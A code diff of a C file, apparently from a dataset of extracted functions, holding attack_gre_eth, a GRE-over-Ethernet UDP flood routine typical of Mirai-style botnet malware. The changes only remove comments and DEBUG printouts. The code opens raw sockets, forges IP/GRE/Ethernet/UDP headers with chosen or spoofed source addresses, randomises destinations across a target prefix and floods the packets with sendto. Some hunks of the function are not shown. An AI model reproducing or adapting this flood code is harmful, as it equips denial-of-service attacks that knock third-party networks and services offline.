@@ -1,73 +1,73 @@
-#define NULL ((void*)0)
-typedef unsigned long size_t;  // Customize by platform.
+
+typedef unsigned long size_t;
 typedef long intptr_t; typedef unsigned long uintptr_t;
-typedef long scalar_t__;  // Either arithmetic or pointer type.
-/* By default, we understand bool (as a convenience). */
+typedef long scalar_t__;
+
 typedef int bool;
-#define false 0
-#define true 1
 
-/* Forward declarations */
-typedef  struct TYPE_4__   TYPE_2__ ;
-typedef  struct TYPE_3__   TYPE_1__ ;
 
-/* Type definitions */
-typedef  int uint8_t ;
-typedef  int uint32_t ;
-typedef  int uint16_t ;
+
+
+typedef struct TYPE_4__ TYPE_2__ ;
+typedef struct TYPE_3__ TYPE_1__ ;
+
+
+typedef int uint8_t ;
+typedef int uint32_t ;
+typedef int uint16_t ;
 struct udphdr {int source; int dest; void* len; scalar_t__ check; } ;
 struct sockaddr_in {int dummy; } ;
 struct sockaddr {int dummy; } ;
-struct iphdr {int version; int ihl; int tos; int id; int ttl; int saddr; int daddr; void* check; int /*<<< orphan*/  protocol; void* frag_off; void* tot_len; } ;
+struct iphdr {int version; int ihl; int tos; int id; int ttl; int saddr; int daddr; void* check; int protocol; void* frag_off; void* tot_len; } ;
 struct grehdr {void* protocol; } ;
 struct ethhdr {scalar_t__ h_source; scalar_t__ h_dest; void* h_proto; } ;
 struct TYPE_3__ {int s_addr; } ;
-struct TYPE_4__ {scalar_t__ sin_port; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; } ;
+struct TYPE_4__ {scalar_t__ sin_port; TYPE_1__ sin_addr; int sin_family; } ;
 struct attack_target {int addr; int netmask; TYPE_2__ sock_addr; } ;
 struct attack_option {int dummy; } ;
-typedef  int port_t ;
-typedef  void* BOOL ;
+typedef int port_t ;
+typedef void* BOOL ;
 
-/* Variables and functions */
- int /*<<< orphan*/  AF_INET ; 
- int /*<<< orphan*/  ATK_OPT_DPORT ; 
- int /*<<< orphan*/  ATK_OPT_GRE_CONSTIP ; 
- int /*<<< orphan*/  ATK_OPT_IP_DF ; 
- int /*<<< orphan*/  ATK_OPT_IP_IDENT ; 
- int /*<<< orphan*/  ATK_OPT_IP_TOS ; 
- int /*<<< orphan*/  ATK_OPT_IP_TTL ; 
- int /*<<< orphan*/  ATK_OPT_PAYLOAD_RAND ; 
- int /*<<< orphan*/  ATK_OPT_PAYLOAD_SIZE ; 
- int /*<<< orphan*/  ATK_OPT_SOURCE ; 
- int /*<<< orphan*/  ATK_OPT_SPORT ; 
- int ETH_P_IP ; 
- int FALSE ; 
- int /*<<< orphan*/  IPPROTO_GRE ; 
- int /*<<< orphan*/  IPPROTO_IP ; 
- int /*<<< orphan*/  IPPROTO_TCP ; 
- int /*<<< orphan*/  IPPROTO_UDP ; 
- int /*<<< orphan*/  IP_HDRINCL ; 
- int LOCAL_ADDR ; 
- int /*<<< orphan*/  MSG_NOSIGNAL ; 
- int PROTO_GRE_TRANS_ETH ; 
- int /*<<< orphan*/  SOCK_RAW ; 
- int TRUE ; 
- void* attack_get_opt_int (int,struct attack_option*,int /*<<< orphan*/ ,int) ; 
- void* calloc (int,int) ; 
- void* checksum_generic (int*,int) ; 
- scalar_t__ checksum_tcpudp (struct iphdr*,struct udphdr*,void*,int) ; 
- int /*<<< orphan*/  close (int) ; 
- scalar_t__ errno ; 
- int htonl (scalar_t__) ; 
- void* htons (int) ; 
- scalar_t__ ntohl (int) ; 
- int /*<<< orphan*/  printf (char*,...) ; 
- int rand_next () ; 
- int /*<<< orphan*/  rand_str (char*,int) ; 
- int /*<<< orphan*/  sendto (int,char*,int,int /*<<< orphan*/ ,struct sockaddr*,int) ; 
- int setsockopt (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int*,int) ; 
- int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
- int /*<<< orphan*/  util_memcpy (scalar_t__,char*,int) ; 
+
+ int AF_INET ;
+ int ATK_OPT_DPORT ;
+ int ATK_OPT_GRE_CONSTIP ;
+ int ATK_OPT_IP_DF ;
+ int ATK_OPT_IP_IDENT ;
+ int ATK_OPT_IP_TOS ;
+ int ATK_OPT_IP_TTL ;
+ int ATK_OPT_PAYLOAD_RAND ;
+ int ATK_OPT_PAYLOAD_SIZE ;
+ int ATK_OPT_SOURCE ;
+ int ATK_OPT_SPORT ;
+ int ETH_P_IP ;
+ int FALSE ;
+ int IPPROTO_GRE ;
+ int IPPROTO_IP ;
+ int IPPROTO_TCP ;
+ int IPPROTO_UDP ;
+ int IP_HDRINCL ;
+ int LOCAL_ADDR ;
+ int MSG_NOSIGNAL ;
+ int PROTO_GRE_TRANS_ETH ;
+ int SOCK_RAW ;
+ int TRUE ;
+ void* attack_get_opt_int (int,struct attack_option*,int ,int) ;
+ void* calloc (int,int) ;
+ void* checksum_generic (int*,int) ;
+ scalar_t__ checksum_tcpudp (struct iphdr*,struct udphdr*,void*,int) ;
+ int close (int) ;
+ scalar_t__ errno ;
+ int htonl (scalar_t__) ;
+ void* htons (int) ;
+ scalar_t__ ntohl (int) ;
+ int printf (char*,...) ;
+ int rand_next () ;
+ int rand_str (char*,int) ;
+ int sendto (int,char*,int,int ,struct sockaddr*,int) ;
+ int setsockopt (int,int ,int ,int*,int) ;
+ int socket (int ,int ,int ) ;
+ int util_memcpy (scalar_t__,char*,int) ;
 
 void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
@@ -86,17 +86,17 @@ void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts
 
     if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
     {
-#ifdef DEBUG
-        printf("Failed to create raw socket. Aborting attack\n");
-#endif
+
+
+
         return;
     }
     i = 1;
     if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
     {
-#ifdef DEBUG
-        printf("Failed to set IP_HDRINCL. Aborting\n");
-#endif
+
+
+
         close(fd);
         return;
     }
@@ -117,7 +117,7 @@ void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         greiph = (struct iphdr *)(ethh + 1);
         udph = (struct udphdr *)(greiph + 1);
 
-        // IP header init
+
         iph->version = 4;
         iph->ihl = 5;
         iph->tos = ip_tos;
@@ -130,13 +130,13 @@ void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         iph->saddr = source_ip;
         iph->daddr = targs[i].addr;
 
-        // GRE header init
-        greh->protocol = htons(PROTO_GRE_TRANS_ETH); // Protocol is 2 bytes
 
-        // Ethernet header init
+        greh->protocol = htons(PROTO_GRE_TRANS_ETH);
+
+
         ethh->h_proto = htons(ETH_P_IP);
 
-        // Encapsulated IP header init
+
         greiph->version = 4;
         greiph->ihl = 5;
         greiph->tos = ip_tos;
@@ -152,7 +152,7 @@ void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         else
             greiph->daddr = ~(greiph->saddr - 1024);
 
-        // UDP header init
+
         udph->source = htons(sport);
         udph->dest = htons(dport);
         udph->len = htons(sizeof (struct udphdr) + data_len);
@@ -171,7 +171,7 @@ void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             char *data = (char *)(udph + 1);
             uint32_t ent1, ent2, ent3;
 
-            // For prefix attacks
+
             if (targs[i].netmask < 32)
                 iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
 
@@ -219,10 +219,10 @@ void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct ethhdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
         }
 
-#ifdef DEBUG
-        if (errno != 0)
-            printf("errno = %d\n", errno);
-        break;
-#endif
+
+
+
+
+
     }
 }
